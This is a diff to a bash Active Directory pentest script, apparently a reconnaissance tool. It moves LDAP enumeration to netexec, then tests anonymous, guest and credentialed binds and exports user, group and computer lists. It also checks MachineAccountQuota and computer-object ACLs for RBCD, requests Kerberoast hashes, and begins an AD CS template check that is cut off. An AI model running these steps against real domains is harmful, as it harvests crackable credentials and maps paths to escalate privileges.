@@ -78,6 +78,17 @@ KERBEROS_AUTH_OK=false
 HAS_WEB=0
 HTTP_FOUND=false
 HTTPS_FOUND=false
+ADCS_VULNERABLE=false
+ENABLE_ADCS=false
+ADCS_SERVICE_DETECTED=false
+MACHINE_ACCOUNT_QUOTA=-1
+CAN_JOIN_COMPUTERS_TO_DOMAIN=false
+HAS_WRITABLE_COMPUTER_ACL=false
+
+# --------- Certificate Services / AD CS ----------
+HAS_CERTIPY=0
+ADCS_TEMPLATES=()
+CERTIPY_OUTPUT=""
 
 # --- Passing in User Info -----
 AUTH_USER=""
@@ -134,6 +145,7 @@ for arg in "$@"; do
         --web-enum) ENABLE_WEB_ENUM=true ;;
         --run-blood) ENABLE_BH_EXPORT=true ;;
         --kerberoast) ENABLE_KERBROAST=true ;;
+        --check-certs) ENABLE_ADCS=true ;;
         *) [ -z "$TARGET" ] && TARGET="$arg" ;;
     esac
 done
@@ -221,21 +233,37 @@ dc_auth_check() {
     local dc="$4"
 
     ########################################
-    # Protocol Selection (LDAP FIRST)
+    # Tool Resolution
     ########################################
-    LDAP_URI="ldap://$dc"
-    # Use LDAPS only if LDAP (389) is NOT open and LDAPS (636) IS open
-    if ! grep -qx 389 "$OPEN_PORTS_FILE" 2>/dev/null \
-        && grep -qx 636 "$OPEN_PORTS_FILE" 2>/dev/null; then
-        LDAP_URI="ldaps://$dc"
+    local LDAP_TOOL
+
+    if command -v netexec >/dev/null 2>&1; then
+        LDAP_TOOL="netexec"
+    elif command -v crackmapexec >/dev/null 2>&1; then
+        LDAP_TOOL="crackmapexec"
+    else
+        return 1
     fi
 
-    # Try a simple LDAP bind (no enumeration)
-    ldapwhoami -x \
-        -H "$LDAP_URI" \
-        -D "$user@$domain" \
-        -w "$pass" \
-        >/dev/null 2>&1
+    ########################################
+    # Credential Validation Only
+    ########################################
+    OUT=$($LDAP_TOOL ldap "$dc" \
+        -u "$user" \
+        -p "$pass" \
+        -d "$domain" \
+        --no-bruteforce \
+        --continue-on-success \
+        2>&1)
+
+    ########################################
+    # Success Detection
+    ########################################
+    if echo "$OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
+        return 0
+    fi
+
+    return 1
 }
 
 gather_bloodhound() {
@@ -451,296 +479,332 @@ ldap_enum() {
     local USE_AUTH="$1"
     local PASSED_DOMAIN="${2:-}"
 
-    # LDAP is noisy — do not let set -e kill enumeration
+    # LDAP is noisy — do not kill parent script
     set +e
 
-    command -v ldapsearch >/dev/null 2>&1 || {
-        warn "ldapsearch not found — skipping LDAP enumeration"
+    ########################################
+    # Tool Resolution (netexec → CME)
+    ########################################
+    if command -v netexec >/dev/null 2>&1; then
+        LDAP_TOOL="netexec"
+    elif command -v crackmapexec >/dev/null 2>&1; then
+        LDAP_TOOL="crackmapexec"
+    else
+        warn "netexec / crackmapexec not found — skipping LDAP enumeration"
+        tip "Install with: pipx install netexec"
         set -e
         return
+    fi
+
+    ########################################
+    # Helper: Pretty Section Output
+    ########################################
+    print_section() {
+        local TITLE="$1"
+        shift
+        local ITEMS=("$@")
+        [[ ${#ITEMS[@]} -eq 0 ]] && return
+
+        success "$TITLE"
+        for i in "${ITEMS[@]}"; do
+            echo "      - $i"
+        done
     }
 
     echo
-    info "LDAP detected — starting safe LDAP enumeration"
-    echo "    Passed Domain:    $PASSED_DOMAIN"
+    info "LDAP enumeration via $LDAP_TOOL"
+    echo "    Passed Domain: $PASSED_DOMAIN"
 
     ########################################
-    # 1. Protocol Selection (LDAP FIRST)
+    # 1. Domain Resolution
     ########################################
-    LDAP_URI="ldap://$TARGET"
-    # Use LDAPS only if LDAP (389) is NOT open and LDAPS (636) IS open
-    if ! grep -qx 389 "$OPEN_PORTS_FILE" 2>/dev/null \
-        && grep -qx 636 "$OPEN_PORTS_FILE" 2>/dev/null; then
-        LDAP_URI="ldaps://$TARGET"
-    fi
-
-    info "Using LDAP URI: $LDAP_URI"
-
-    ########################################
-    # 2. Bind Arguments
-    ########################################
-    LDAP_BIND_ARGS="-x"
-    if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
-        info "Using authenticated LDAP bind (UPN format)"
-        #LDAP_BIND_ARGS="-x -D '${AUTH_USER}@${PASSED_DOMAIN}' -w '$AUTH_PASS'"
-        LDAP_BIND_ARGS=(-x -D "${AUTH_USER}@${PASSED_DOMAIN}" -w "$AUTH_PASS")
-    fi
-    #if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
-    #    info "Using authenticated LDAP bind"
-    #    LDAP_BIND_ARGS="-x -D '${PASSED_DOMAIN}\\$AUTH_USER' -w '$AUTH_PASS'"
-    #fi
-
-    ########################################
-    # 3. Base DN Resolution (STATE-AWARE)
-    ########################################
-
-    # 3a. If BASE DN already known — reuse it
-    if [[ -n "$LDAP_BASE_DN" && "$LDAP_BASE_DN" =~ ^DC= ]]; then
-        info "Reusing previously discovered LDAP base DN"
+    if [[ -n "$PASSED_DOMAIN" ]]; then
+        LDAP_DOMAIN="${PASSED_DOMAIN,,}"
+    elif [[ -n "$AUTH_DOMAIN" ]]; then
+        LDAP_DOMAIN="${AUTH_DOMAIN,,}"
     else
-        # 3b. If domain passed explicitly — derive Base DN
-        if [[ -n "$PASSED_DOMAIN" ]]; then
-            info "Using provided domain for LDAP base DN"
-            LDAP_DOMAIN="${PASSED_DOMAIN,,}"
-            LDAP_BASE_DN=$(echo "$LDAP_DOMAIN" | awk -F. '{
-                for (i=1;i<=NF;i++)
-                    printf "DC=%s%s", toupper($i), (i<NF?",":"")
-            }')
-        else
-            # 3c. Query RootDSE over LDAP FIRST
-            info "Querying LDAP RootDSE for naming context"
-
-            LDAP_BASE_DN=$(
-                ldapsearch -x -H ldap://$TARGET -s base -b "" defaultNamingContext 2>/dev/null \
-                | sed -n 's/^defaultNamingContext:[[:space:]]*//p'
-            )
-
-            # 3d. Fallback to LDAPS only if LDAP fails AND auth is used
-            if [[ -z "$LDAP_BASE_DN" && "$USE_AUTH" == "auth" ]] && grep -qx 636 "$OPEN_PORTS_FILE"; then
-                warn "LDAP RootDSE failed — retrying over LDAPS"
-                LDAP_BASE_DN=$(
-                    ldapsearch -x -H ldaps://$TARGET -s base -b "" defaultNamingContext 2>/dev/null \
-                    | sed -n 's/^defaultNamingContext:[[:space:]]*//p'
-                )
-            fi
-        fi
-
-        # Derive domain if Base DN resolved
-        if [[ "$LDAP_BASE_DN" =~ ^DC= ]]; then
-            LDAP_DOMAIN=$(echo "$LDAP_BASE_DN" | sed 's/DC=//g; s/,/./g' | tr '[:upper:]' '[:lower:]')
-        fi
-    fi
-
-    ########################################
-    # 4. Validate Naming Context
-    ########################################
-    if [[ -z "$LDAP_BASE_DN" || ! "$LDAP_BASE_DN" =~ ^DC= ]]; then
-        notify "LDAP present but naming context not disclosed"
+        warn "No domain provided — LDAP enumeration limited"
         set -e
         return
     fi
 
+    LDAP_BASE_DN=$(echo "$LDAP_DOMAIN" | awk -F. '{
+        for (i=1;i<=NF;i++)
+            printf "DC=%s%s", toupper($i), (i<NF?",":"")
+    }')
+
     success "LDAP domain identified: $LDAP_DOMAIN"
     note "Base DN: $LDAP_BASE_DN"
-
     echo "$TARGET $LDAP_DOMAIN" >> "$HOSTS_FILE"
 
     ########################################
-    # 5. Anonymous Bind Test (Only if anon)
+    # 2. Bind Capability Detection (FIXED)
     ########################################
     if [[ "$USE_AUTH" != "auth" ]]; then
-        info "Testing anonymous LDAP bind"
+        info "Testing Anonymous LDAP bind"
         echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-        echo -e "        ${GREEN}ldapsearch -x -H '$LDAP_URI' -b $LDAP_BASE_DN -s base '(objectClass=*)'${RESET}"
-        echo -e "        ${GREEN}netexec ldap $TARGET -u '' -p ''${RESET}"
-        echo -e "        ${GREEN}netexec ldap $TARGET -d $LDAP_BASE_DN --anonymous${RESET}"
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET --anonymous${RESET}"
+        ANON_OUT=$($LDAP_TOOL ldap "$TARGET" --anonymous 2>&1)
 
-
-        ldapsearch -x -H "$LDAP_URI" -b "$LDAP_BASE_DN" -s base "(objectClass=*)" >/dev/null 2>&1
-
-        if [[ $? -ne 0 ]]; then
-            notify "Anonymous LDAP bind not permitted"
-            set -e
-            return
-        fi
-
-        critical "Anonymous LDAP bind allowed"
-        LDAP_ANON_BIND=true
-    fi
-    ########################################
-    # 5b. Guest Bind Test (Only if 'anon' is passed)
-    ########################################
-    if [[ "$USE_AUTH" != "auth" ]]; then
-	info "Testing LDAP Guest bind (${LDAP_DOMAIN}\\Guest)"
-
-	echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-	echo -e "        ${GREEN}ldapsearch -x -H '$LDAP_URI' -D '${LDAP_DOMAIN}\\Guest' -w '' -b '$LDAP_BASE_DN' -s base '(objectClass=*)'${RESET}"
-	echo -e "        ${GREEN}netexec ldap $TARGET -d $LDAP_DOMAIN -u Guest -p ''${RESET}"
-
-	ldapsearch -x \
-	    -H "$LDAP_URI" \
-	    -D "${LDAP_DOMAIN}\\Guest" \
-	    -w '' \
-	    -b "$LDAP_BASE_DN" \
-	    -s base "(objectClass=*)" \
-	>/dev/null 2>&1
-
-	if [[ $? -eq 0 ]]; then
-		critical "LDAP Guest bind allowed (DOMAIN\\Guest)"
-		LDAP_GUEST_BIND=true
-
-		# Prefer Guest over anonymous for enumeration
-		LDAP_BIND_ARGS=(-x -D "${LDAP_DOMAIN}\\Guest" -w "")
-	    else 
-	    warn "LDAP Guest bind not permitted"
-	fi
-    fi
-
-    ########################################
-    # 6. Enumeration (Read-Only)
-    ########################################
-
-    info "Enumerating domain password policy..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(objectClass=domainDNS)' minPwdLength lockoutThreshold maxPwdAge${RESET}"
-    ldapsearch $LDAP_BIND_ARGS -H $LDAP_URI -b $LDAP_BASE_DN '(objectClass=domainDNS)' minPwdLength lockoutThreshold maxPwdAge 2>/dev/null | sed 's/^/    /'
-    ldapsearch "${LDAP_BIND_ARGS[@]}" -H $LDAP_URI -b $LDAP_BASE_DN '(objectClass=domainDNS)' minPwdLength lockoutThreshold maxPwdAge 2>/dev/null | sed 's/^/    /'
-    
-
-    info "Enumerating users..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(&(objectClass=user)(!(objectClass=computer)))' sAMAccountName userPrincipalName${RESET}"
-    ldapsearch "${LDAP_BIND_ARGS[@]}" -H $LDAP_URI -b $LDAP_BASE_DN '(&(objectClass=user)(!(objectClass=computer)))' sAMAccountName userPrincipalName 2>/dev/null | awk '/^sAMAccountName:/ {print "    - "$2}'
-    
-    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
-    #USERS_FILE="users_${TARGET}_${DATE_TAG}.txt"
-    LDAP_USERS_TMP="users_${TARGET}_${DATE_TAG}.txt"
-
-    ldapsearch ${LDAP_BIND_ARGS[@]} -H "$LDAP_URI" -b "$LDAP_BASE_DN" "(&(objectClass=user)(!(objectClass=computer)))" sAMAccountName 2>/dev/null \
-    | awk '/^sAMAccountName:/ { print $2 }' \
-    | sort -u > "$LDAP_USERS_TMP"
-    ########################################
-    ##    Set USERS_FILE from LDAP enum (if unset)
-    ########################################
-    if [[ -z "${USERS_FILE:-}" ]]; then
-        if [[ -s "$LDAP_USERS_TMP" ]]; then
-            USERS_FILE="$LDAP_USERS_TMP"
-            export USERS_FILE
-            success "Users were found! Users were written to: ${BLUE}$USERS_FILE${RESET}"
+        if echo "$ANON_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
+            LDAP_ANON_BIND=true
+            success "Anonymous LDAP bind allowed"
         else
-            notify "LDAP user enumeration returned no users — 'USERS_FILE' not set"
+            warn "Anonymous LDAP bind denied"
         fi
-    else
-        info "Users were already found and set — preserving existing values: ${BLUE}$USERS_FILE${RESET}"
     fi
 
-    info "Enumerating groups..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(&(objectClass=group)' cn${RESET}"
-    ldapsearch "${LDAP_BIND_ARGS[@]}" -H $LDAP_URI -b $LDAP_BASE_DN '(objectClass=group)' cn 2>/dev/null | awk '/^cn:/ {print "    - "$2}'
+    if [[ "$USE_AUTH" != "auth" ]]; then
+        info "Testing Guest LDAP bind (${LDAP_DOMAIN}\\Guest)"
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET -d $LDAP_DOMAIN -u 'guest' -p ''${RESET}"
+        GUEST_OUT=$($LDAP_TOOL ldap "$TARGET" -d "$LDAP_DOMAIN" -u guest -p '' 2>&1)
 
-    info "Enumerating computers..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(&(objectClass=computer))' dNSHostName${RESET}"
-    ldapsearch "${LDAP_BIND_ARGS[@]}" -H $LDAP_URI -b $LDAP_BASE_DN "(&(objectClass=computer))" dNSHostName 2>/dev/null | awk '/^dNSHostName:/ {print "    - "$2}'
-
-    ########################################
-    # 7. High-Impact Checks
-    ########################################
-
-    info "Checking for LAPS exposure..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwdExpirationTime${RESET}"
-    LAPS_OUTPUT=$(ldapsearch "${LDAP_BIND_ARGS[@]}" -H "$LDAP_URI" -b "$LDAP_BASE_DN" \
-        "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd ms-MCS-AdmPwdExpirationTime 2>/dev/null)
-    if echo "$LAPS_OUTPUT" | grep -Eq '^dn: '; then
-        critical "LAPS password attribute readable (HIGH RISK)"
-
-        echo
-        warn "Exposed LAPS attributes:"
-        echo "$LAPS_OUTPUT" | sed 's/^/    /'
-        LAPS_READABLE=true
-    else
-        info "LAPS password attribute not readable"
+        if echo "$GUEST_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
+            LDAP_GUEST_BIND=true
+            success "Guest LDAP bind allowed"
+        else
+            warn "Guest LDAP bind denied"
+        fi
     fi
 
+    if [[ "$USE_AUTH" == "auth" && "$CREDS_PROVIDED" == true ]]; then
+        info "Testing Authenticated LDAP bind ($AUTH_USER|$AUTH_PASS)"
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+	echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET -d $LDAP_DOMAIN -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+        AUTH_OUT=$($LDAP_TOOL ldap "$TARGET" -d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" 2>&1)
 
-    info "Searching for Kerberos SPNs..."
-    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
-    echo -e "        ${GREEN}ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(servicePrincipalName=*)' sAMAccountName servicePrincipalName${RESET}"
-    ldapsearch "${LDAP_BIND_ARGS[@]}" -H "$LDAP_URI" -b "$LDAP_BASE_DN" \
-        "(servicePrincipalName=*)" sAMAccountName servicePrincipalName 2>/dev/null \
-        | awk '/^sAMAccountName:/ {print "    - "$2}'
-
-    ########################################
-    # Kerberoast Target Detection (LDAP-only)
-    ########################################
-    KERBEROAST_FILE="kerberoast_${TARGET}_${DATE_TAG}.txt"
-
-    SPN_USERS=$(ldapsearch "${LDAP_BIND_ARGS[@]}" -H "$LDAP_URI" -b "$LDAP_BASE_DN" "(&(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))" \
-        sAMAccountName servicePrincipalName 2>/dev/null)
-
-    if echo "$SPN_USERS" | grep -q "^dn:"; then
-        high_risk "Potential Kerberoast targets detected (SPNs on user accounts)"
-        #echo "# Kerberoast Candidates for $TARGET" > "$KERBEROAST_FILE"
-        #echo "# Generated via LDAP enumeration (no tickets requested)" >> "$KERBEROAST_FILE"
-        #echo >> "$KERBEROAST_FILE"
-
-        echo "$SPN_USERS" \
-          | awk '
-            /^sAMAccountName:/ { user=$2 }
-            /^servicePrincipalName:/ {
-                print user " :: " $2
-            }
-          ' >> "$KERBEROAST_FILE"
-        success "Saved Kerberoast candidates to $KERBEROAST_FILE"
-    else
-        info "No user-based SPNs detected (no Kerberoast candidates)"
-    fi
-
-    ########################################
-    # 8. Optional ldapdomaindump
-    ########################################
-    if command -v ldapdomaindump >/dev/null 2>&1; then
-        info "Running ldapdomaindump (read-only)"
-        mkdir -p "ldap_dump_$TARGET"
-        ldapdomaindump -u '' -p '' -o "ldap_dump_$TARGET" "$LDAP_URI" >/dev/null 2>&1 \
-            && success "ldapdomaindump completed (ldap_dump_$TARGET)"
-    fi
-
-    ########################################
-    # 9. Auth-Only Enumeration
-    ########################################
-    if [[ "$USE_AUTH" == "auth" ]]; then
-        echo
-        critical "Authenticated LDAP access confirmed"
-
-        info "Enumerating all domain users (authenticated)"
-        echo "    ldapsearch ${LDAP_BIND_ARGS[@]} -H $LDAP_URI -b $LDAP_BASE_DN '(&(objectClass=user)(!(objectClass=computer)))' sAMAccountName memberOf userPrincipalName"
-        ldapsearch ${LDAP_BIND_ARGS[@]} -H "$LDAP_URI" -b "$LDAP_BASE_DN" \
-            "(&(objectClass=user)(!(objectClass=computer)))" \
-            sAMAccountName memberOf userPrincipalName 2>/dev/null \
-        | awk '
-            /^sAMAccountName:/ {
-                user=$2
-                print "    - " user
-            }
-        '
-        
-        ldapsearch ${LDAP_BIND_ARGS[@]} -H "$LDAP_URI" -b "$LDAP_BASE_DN" \
-            "(&(objectClass=user)(!(objectClass=computer)))" \
-            sAMAccountName memberOf userPrincipalName 2>&1
-        if [[ $? -eq 0 ]]; then
+        if echo "$AUTH_OUT" | grep -Eq '^\s*LDAP\s+.*\[\+\]'; then
             LDAP_AUTH_BIND=true
-            critical "Authenticated LDAP Access Confirmed! ${AUTH_USER}|${AUTH_PASS}"
+            success "Authenticated LDAP bind successful"
         else
             warn "Authenticated LDAP bind failed"
         fi
     fi
+    echo
+    ########################################
+    # 3. Select Best Available Bind
+    ########################################
+    LDAP_EXEC_ARGS=()
+    LDAP_BIND_TYPE=""
 
+    if [[ "$LDAP_AUTH_BIND" == true ]]; then
+        LDAP_BIND_TYPE="auth"
+        LDAP_EXEC_ARGS=(-d "$LDAP_DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS")
+    elif [[ "$LDAP_GUEST_BIND" == true ]]; then
+        LDAP_BIND_TYPE="guest"
+        LDAP_EXEC_ARGS=(-d "$LDAP_DOMAIN" -u "guest" -p "")
+    elif [[ "$LDAP_ANON_BIND" == true ]]; then
+        LDAP_BIND_TYPE="anon"
+        LDAP_EXEC_ARGS=(--anonymous)
+    else
+        notify "LDAP service present but no usable bind available"
+        set -e
+        return
+    fi
+    echo
+    success "Using LDAP bind type: ${BLUE}$LDAP_BIND_TYPE${RESET}"
+    echo
+    ########################################
+    # 4. Enumerate Users (FIXED FOR REAL)
+    ########################################
+    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+    LDAP_USERS_TMP="users_${TARGET}_${DATE_TAG}.txt"
+    LDAP_USERS_CSV="users_${TARGET}_${DATE_TAG}.csv"
+    info "Enumerating users"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --users${RESET}"
+    mapfile -t LDAP_USERS < <(
+        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --users 2>/dev/null \
+            | sed -nE '
+                /^\s*LDAP/ {
+                    /\[|\]|-Username-|Enumerated/ b
+                    s/^.*AUTHORITY[[:space:]]+([A-Za-z0-9._-]+)[[:space:]].*$/\1/p
+                }
+            ' \
+            | sort -u
+    )
+
+    if [[ ${#LDAP_USERS[@]} -gt 0 ]]; then
+        printf "%s\n" "${LDAP_USERS[@]}" > "$LDAP_USERS_TMP"
+        
+        # Write all users to CSV
+        {
+            echo "Username"
+            printf "%s\n" "${LDAP_USERS[@]}"
+        } > "$LDAP_USERS_CSV"
+        success "All users saved to CSV: ${BLUE}$LDAP_USERS_CSV${RESET}"
+        
+        if [[ -z "${USERS_FILE:-}" ]]; then
+            USERS_FILE="$LDAP_USERS_TMP"
+            export USERS_FILE
+            success "All users saved to TXT: ${BLUE}$USERS_FILE${RESET}"
+        fi
+        
+        # Display only first 25 users
+        print_section "Users Discovered (first 25 shown):" "${LDAP_USERS[@]:0:25}"
+    else
+        warn "No users parsed from LDAP output"
+    fi
+    echo
+    ########################################
+    # 5. Enumerate Groups (LIMITED DISPLAY + CSV)
+    ########################################
+    info "Enumerating groups"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --groups${RESET}"
+    # Parse groups with membercount
+    mapfile -t LDAP_GROUPS_RAW < <(
+        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --groups 2>/dev/null \
+            | sed -nE '
+                /^\s*LDAP.*membercount:/ {
+                    s/^.*AUTHORITY[[:space:]]+//
+                    s/[[:space:]]+membercount:/|/g
+                    s/^[[:space:]]+|[[:space:]]+$//g
+                    p
+                }
+            ' \
+            | sort -u
+    )
+
+    # Separate names and counts for display
+    LDAP_GROUPS=()
+    for g in "${LDAP_GROUPS_RAW[@]}"; do
+        LDAP_GROUPS+=("${g%%|*}")   # Extract just the name for printing
+    done
+
+    # Print only the first 25 groups
+    if [[ ${#LDAP_GROUPS[@]} -gt 0 ]]; then
+        print_section "Security Groups (first 25 shown):" "${LDAP_GROUPS[@]:0:25}"
+        # Save all to CSV (GroupName,MemberCount)
+        LDAP_GROUPS_CSV="groups_${TARGET}_$(date +%Y%m%d_%H%M%S).csv"
+        {
+            echo "GroupName,MemberCount"
+            for g in "${LDAP_GROUPS_RAW[@]}"; do
+                echo "$g"
+            done
+        } > "$LDAP_GROUPS_CSV"
+
+        success "All groups saved to CSV: ${BLUE}$LDAP_GROUPS_CSV${RESET}"
+    else
+        warn "No security groups parsed from LDAP output"
+    fi
+    echo
+    ########################################
+    # 6. Enumerate Computers
+    ########################################
+    info "Enumerating computers"
+    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+    LDAP_COMPUTERS_CSV="computers_${TARGET}_${DATE_TAG}.csv"
+
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --computers${RESET}"
+    mapfile -t LDAP_COMPUTERS < <(
+        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --computers 2>/dev/null \
+            | awk '{print $NF}' \
+            | grep '\$$' \
+            | sort -u
+    )
+    
+    if [[ ${#LDAP_COMPUTERS[@]} -gt 0 ]]; then
+        # Write ALL computers to CSV
+        {
+            echo "ComputerName"
+            printf "%s\n" "${LDAP_COMPUTERS[@]}"
+        } > "$LDAP_COMPUTERS_CSV"
+
+        success "All computers saved to CSV: ${BLUE}$LDAP_COMPUTERS_CSV${RESET}"
+
+        # Display ONLY first 25
+        print_section "Computers Discovered (first 25 shown):" "${LDAP_COMPUTERS[@]:0:25}"
+
+    else
+        warn "No computers parsed from LDAP output"
+    fi
+    echo
+    ########################################
+    # 7. MachineAccountQuota
+    ########################################
+    info "Enumerating MachineAccountQuota"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} -M maq${RESET}"
+    MAQ_VALUE=$(
+        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" -M maq 2>/dev/null \
+            | tr -d '\000' \
+            | awk -F': ' '/MachineAccountQuota/ {print $2}' \
+            | tail -n1
+    )
+
+    if [[ -n "$MAQ_VALUE" && "$MAQ_VALUE" =~ ^[0-9]+$ ]]; then
+        if (( MAQ_VALUE > 0 )); then
+            MAQ_ENABLED=true
+            CAN_JOIN_COMPUTERS_TO_DOMAIN=true
+            MACHINE_ACCOUNT_QUOTA="$MAQ_VALUE"
+            critical "MachineAccountQuota = $MAQ_VALUE (user can add computers)"
+        else
+            success "MachineAccountQuota = 0 (no domain join privilege)"
+        fi
+    else
+        warn "MachineAccountQuota not detected in LDAP output"
+    fi
+    echo
+    ########################################
+    # 8. Kerberoast Surface (FILE-BASED)
+    ########################################
+    info "Enumerating Kerberoastable accounts"
+    DATE_TAG=$(date +"%Y%m%d_%H%M%S")
+    KERBEROAST_OUT="kerberoast_${TARGET}_${DATE_TAG}.txt"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} --kerberoasting $KERBEROAST_OUT${RESET}"
+    $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" --kerberoasting "$KERBEROAST_OUT" 2>/dev/null
+
+    # Validate output file
+    if [[ -f "$KERBEROAST_OUT" && -s "$KERBEROAST_OUT" ]]; then
+        success "Kerberoastable accounts identified"
+        success "Kerberoast hashes saved to: ${BLUE}$KERBEROAST_OUT${RESET}"
+
+        # Optional: extract principals for on-screen display
+        mapfile -t KERBEROAST_TARGETS < <(
+            grep -E '^\$krb5tgs\$' "$KERBEROAST_OUT" \
+                | awk -F':' '{print $NF}' \
+                | sort -u
+        )
+
+        if [[ ${#KERBEROAST_TARGETS[@]} -gt 0 ]]; then
+            print_section "Kerberoast Targets (SPNs):" "${KERBEROAST_TARGETS[@]}"
+        fi
+    else
+        warn "No kerberoastable accounts found (output file empty or not created)"
+        rm -f "$KERBEROAST_OUT" 2>/dev/null
+    fi
+    echo
+    ########################################
+    # 9. Writable Computer Objects
+    ########################################
+    # TODO: Fix This... Not Working the way it needs to work. 
+    info "Checking for writable computer object ACLs (RBCD)"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$LDAP_TOOL ldap $TARGET ${LDAP_EXEC_ARGS[@]} -M daclread -o TARGET_DN="CN=Computers,$LDAP_BASE_DN" ACTION=read${RESET}"
+
+    DACL_OUT=$(
+        $LDAP_TOOL ldap "$TARGET" "${LDAP_EXEC_ARGS[@]}" -M daclread \
+            -o TARGET_DN="CN=Computers,$LDAP_BASE_DN" ACTION=read \
+            2>/dev/null
+    )
+
+    if echo "$DACL_OUT" | grep -Eq \
+        'Access mask\s*:\s*(GenericWrite|WriteDacl|WriteProperty)'; then
+        HAS_WRITABLE_COMPUTER_ACL=true
+        critical "Writable computer ACL detected — RBCD viable"
+    fi
+
+    ########################################
+    # Done
+    ########################################
     LDAP_ENUM_DONE=true
     set -e
 }
+
 
 kerberos_auth_check() {
     command -v kinit >/dev/null 2>&1 || {
@@ -1616,12 +1680,35 @@ fi
 
 # --------- LDAP Enumeration ----------
 if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
-    echo "LDAP_ENUM ANON"
+    echo
+    info "Querying LDAP RootDSE..."
+
+
+    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "389"; then
+        LDAP_URI="ldap://$TARGET"
+    elif printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx "636"; then
+	LDAP_URI="ldaps://$TARGET"
+    fi
+    ldap_dn=$(
+         ldapsearch -x -H "$LDAP_URI" -s base -b "" defaultNamingContext 2>/dev/null \
+         | sed -n 's/^defaultNamingContext:[[:space:]]*//p'
+     )
+
+     if [[ "$ldap_dn" =~ ^DC= ]]; then
+        LDAP_DOMAIN=$(echo "$ldap_dn" | sed 's/DC=//g; s/,/./g' | tr '[:upper:]' '[:lower:]')
+        info "LDAP service present/open. DOMAIN is disclosed: ${BLUE}$LDAP_DOMAIN${RESET}"
+     else
+     	info "LDAP service present/open but DOMAIN not disclosed"
+     fi
+    
+    #echo "LDAP_ENUM ANON"
+    echo
     ldap_enum anon "${AUTH_DOMAIN:-$LDAP_DOMAIN}"
 
-    echo "LDAP_ENUM With Creds"
+    #echo "LDAP_ENUM With Creds"
+    echo
     $CREDS_PROVIDED && ldap_enum auth "${AUTH_DOMAIN:-$LDAP_DOMAIN}"
-    
+    echo
     if $LDAP_AUTH_BIND; then
         high_risk "LDAP Exposure Level: Directory is Accessible with known/compromised credentials"
     fi
@@ -1722,6 +1809,167 @@ if $CREDS_PROVIDED; then
 fi
 
 ########################################
+# AD CS Vulnerable Certificate Detection
+########################################
+if [[ "$HAS_LDAP" -eq 1 && "$HAS_KERB" -eq 1 && "$ENABLE_ADCS" == true && "$CREDS_PROVIDED" == true ]]; then
+    echo
+    target_ca=""
+    if command -v certipy-ad >/dev/null 2>&1; then
+        info "Checking for vulnerable AD CS certificate templates"
+
